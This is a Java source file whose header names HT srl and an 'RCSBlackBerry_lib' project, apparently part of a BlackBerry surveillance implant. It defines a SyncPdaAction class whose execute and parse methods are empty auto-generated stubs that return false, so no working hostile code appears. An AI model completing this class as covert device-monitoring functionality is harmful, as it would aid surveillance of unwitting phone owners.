/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SyncPdaAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.event.Event;

public class SyncPdaAction extends SubAction {

    public SyncPdaAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    public boolean execute(Event triggeringEvent) {
        // TODO Auto-generated method stub
        return false;
    }

    protected boolean parse(byte[] confParams) {
        // TODO Auto-generated method stub
        return false;
    }

}
